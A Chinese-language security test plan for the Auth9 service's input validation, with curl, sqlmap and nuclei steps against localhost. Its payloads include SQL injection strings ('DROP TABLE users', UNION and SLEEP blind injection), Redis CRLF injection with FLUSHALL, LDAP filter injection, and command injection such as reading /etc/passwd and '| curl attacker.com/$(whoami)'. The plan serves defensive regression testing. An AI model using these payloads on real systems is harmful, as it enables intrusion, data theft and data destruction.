# 输入验证 - 注入攻击测试

**模块**: 输入验证
**测试范围**: SQL 注入、NoSQL 注入、命令注入
**场景数**: 5
**风险等级**: 🔴 极高
**ASVS 5.0 矩阵ID**: M-INPUT-01
**OWASP ASVS 5.0**: V1.2,V2.1,V4.2
**回归任务映射**: Backlog #20


---

## 背景知识

Auth9 技术栈注入风险点：
- **SQL**: TiDB (MySQL 兼容)，使用 sqlx 参数化查询
- **Redis**: 可能的命令注入
- **Keycloak API**: HTTP 参数注入

---

## 场景 1：SQL 注入 - 认证绕过

### 前置条件
- 访问登录或认证相关端点

### 攻击目标
验证认证流程是否存在 SQL 注入

### 攻击步骤
1. 在用户名/邮箱字段注入：
   - `admin'--`
   - `' OR '1'='1`
   - `admin'; DROP TABLE users;--`
2. 在密码字段注入
3. 检查响应和数据库状态

### 预期安全行为
- 输入被正确转义或参数化
- 返回正常的认证失败
- 数据库不受影响

### 验证方法
```bash
# 认证相关入口注入测试（Headless 架构下不使用 /api/v1/auth/token + password grant）
curl -X POST http://localhost:8080/api/v1/auth/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"email":"admin''--@example.com"}'
# 预期: 400 或通用成功响应（不是 SQL 错误）

curl -X POST http://localhost:8080/api/v1/auth/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"email":"%27%20OR%20%271%27%3D%271@example.com"}'
# 预期: 400 或通用成功响应（不应触发 SQL 语义）

# 使用 sqlmap 自动化测试
sqlmap -u "http://localhost:8080/api/v1/users?search=test" \
  --headers="Authorization: Bearer $TOKEN" \
  --level=3 --risk=2
```

### 修复建议
- 使用参数化查询 (sqlx 已支持)
- 输入验证和长度限制
- 错误信息不暴露 SQL 细节
- 数据库用户最小权限

---

## 场景 2：SQL 注入 - 数据提取

### 前置条件
- 具有搜索/过滤功能的端点
- 有效的认证 Token

### 攻击目标
验证搜索功能是否可被用于数据提取

### 攻击步骤
1. 找到搜索/过滤端点
2. 尝试注入：
   - `test' UNION SELECT * FROM users--`
   - `test' AND 1=1--` vs `test' AND 1=2--`
   - 盲注：`test' AND SLEEP(5)--`
3. 分析响应差异

### 预期安全行为
- UNION 注入不返回额外数据
- 布尔盲注响应一致
- 时间盲注不延迟

### 验证方法
```bash
# 搜索端点测试
curl -H "Authorization: Bearer $TOKEN" \
  "http://localhost:8080/api/v1/users?search=test'+UNION+SELECT+password+FROM+users--"
# 预期: 正常搜索结果 (不包含密码)

# 布尔盲注
curl -H "Authorization: Bearer $TOKEN" \
  "http://localhost:8080/api/v1/users?search=test'+AND+'1'='1"
curl -H "Authorization: Bearer $TOKEN" \
  "http://localhost:8080/api/v1/users?search=test'+AND+'1'='2"
# 预期: 两次响应相同 (没有布尔差异)

# 时间盲注
time curl -H "Authorization: Bearer $TOKEN" \
  "http://localhost:8080/api/v1/users?search=test'+AND+SLEEP(5)--"
# 预期: 响应时间 < 1秒
```

### 修复建议
- 搜索使用 LIKE 参数化
- 限制返回字段
- 添加查询超时
- 监控异常查询模式

---

## 场景 3：NoSQL / Redis 注入

### 前置条件
- 系统使用 Redis 缓存
- 了解 Redis 命令结构

### 攻击目标
验证 Redis 操作是否存在注入风险

### 攻击步骤
1. 找到可能使用 Redis 的功能：
   - Session 存储
   - 缓存键构造
   - 限流计数器
2. 尝试注入 Redis 命令：
   - 在缓存键中注入 `\r\n`
   - 尝试 KEYS * 通配符
3. 检查是否能执行任意命令

### 预期安全行为
- 缓存键正确转义
- 不能执行额外命令
- 限制可访问的键空间

### 验证方法
```bash
# 在可能影响缓存键的参数中注入
curl -H "Authorization: Bearer $TOKEN" \
  "http://localhost:8080/api/v1/users?cache_key=test\r\nKEYS+*\r\n"
# 预期: 正常响应 (注入未生效)

# 检查 Redis 日志
redis-cli MONITOR
# 观察是否有异常命令

# 尝试在 session 相关参数注入
curl -X POST http://localhost:8080/api/v1/auth/login \
  -H "X-Session-ID: test\r\nFLUSHALL\r\n"
# 预期: 忽略或拒绝
```

### 修复建议
- 缓存键使用固定前缀
- 过滤或编码特殊字符
- Redis 密码保护
- 限制 Redis 命令权限

---

## 场景 4：LDAP / Keycloak 注入

### 前置条件
- 系统与 Keycloak 集成
- 用户搜索功能

### 攻击目标
验证 Keycloak Admin API 调用是否存在注入

### 攻击步骤
1. 找到用户搜索/同步功能
2. 在搜索参数中注入 LDAP 语法：
   - `*)(uid=*`
   - `admin)(|(password=*)`
3. 检查是否返回未授权数据

### 预期安全行为
- 搜索参数被正确转义
- 不能构造任意 LDAP 查询
- 错误信息不暴露内部结构

### 验证方法
```bash
# Keycloak 用户搜索
curl -H "Authorization: Bearer $TOKEN" \
  "http://localhost:8080/api/v1/users?search=*)(%26"
# 预期: 空结果或 400 错误

# 检查 Keycloak 日志是否有异常查询
docker logs keycloak 2>&1 | grep -i "search"
```

### 修复建议
- 转义 LDAP 特殊字符
- 使用 Keycloak SDK 的安全方法
- 限制搜索返回字段
- 输入白名单验证

---

## 场景 5：命令注入

### 前置条件
- 系统可能执行外部命令的功能
- 如文件处理、图片处理等

### 攻击目标
验证是否存在命令注入漏洞

### 攻击步骤
1. 找到可能执行命令的功能：
   - 头像上传/处理
   - 日志导出
   - 邮件发送
2. 在文件名或参数中注入：
   - `; cat /etc/passwd`
   - `| curl attacker.com/$(whoami)`
   - `` `whoami` ``
3. 检查响应或外部回调

### 预期安全行为
- 不执行注入的命令
- 文件名被安全处理
- 返回正常错误

### 验证方法
```bash
# 如果有文件上传功能
curl -X POST -H "Authorization: Bearer $TOKEN" \
  -F "avatar=@test.png;filename='; cat /etc/passwd'" \
  http://localhost:8080/api/v1/users/me/avatar
# 预期: 正常上传或 400

# 检查是否有回调
# 在注入 payload 中包含 callback URL
# 监控是否收到请求

# 邮件功能测试
curl -X POST -H "Authorization: Bearer $TOKEN" \
  http://localhost:8080/api/v1/system/email/test \
  -d '{"to": "test@example.com; cat /etc/passwd |"}'
# 预期: 400 Invalid email
```

### 修复建议
- 避免执行外部命令
- 使用语言原生库替代 shell
- 严格输入验证
- 使用沙箱环境

---

## 检查清单

| # | 场景 | 状态 | 测试日期 | 测试人员 | 发现问题 |
|---|------|------|----------|----------|----------|
| 1 | SQL 注入 - 认证绕过 | ✅ | 2026-02-15 | QA测试 | 通过 - 无漏洞 |
| 2 | SQL 注入 - 数据提取 | ✅ | 2026-02-15 | QA测试 | 通过 - 无漏洞 |
| 3 | NoSQL / Redis 注入 | ✅ | 2026-02-15 | QA测试 | 通过 - 无漏洞 |
| 4 | LDAP / Keycloak 注入 | ✅ | 2026-02-15 | QA测试 | 通过 - 无漏洞 |
| 5 | 命令注入 | ✅ | 2026-02-15 | QA测试 | 通过 - 无漏洞 |

---

## 自动化测试工具

```bash
# SQLMap - SQL 注入
sqlmap -u "http://localhost:8080/api/v1/users?search=test" \
  --headers="Authorization: Bearer $TOKEN" \
  --batch --level=5 --risk=3

# Burp Suite - 主动扫描
# 配置代理后使用 Scanner 功能

# Nuclei - 模板扫描
nuclei -u http://localhost:8080 -t sqli/
```

---

## 参考资料

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)
- [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)

---


---

## 标准化回归 Checklist（ASVS 5.0）

**矩阵ID**: M-INPUT-01  
**适用控制**: V1.2,V2.1,V4.2  
**关联任务**: Backlog #20  
**建议回归频率**: 每次发布前 + 缺陷修复后必跑  
**场景总数**: 5

### 执行清单
- [ ] M-INPUT-01-C01 | 控制: V1.2 | 任务: #20 | 动作: 执行文档内相关攻击步骤并记录证据
- [ ] M-INPUT-01-C02 | 控制: V2.1 | 任务: #20 | 动作: 执行文档内相关攻击步骤并记录证据
- [ ] M-INPUT-01-C03 | 控制: V4.2 | 任务: #20 | 动作: 执行文档内相关攻击步骤并记录证据

### 回归记录表
| 检查项ID | 执行结果(pass/fail) | 风险等级 | 证据（请求/响应/日志/截图） | 备注 |
|---|---|---|---|---|
|  |  |  |  |  |

### 退出准则
1. 所有检查项执行完成，且高风险项无 `fail`。
2. 如存在 `fail`，必须附带漏洞单号、修复计划和复测结论。
3. 回归报告需同时记录矩阵ID与 Backlog 任务号，便于跨版本追溯。
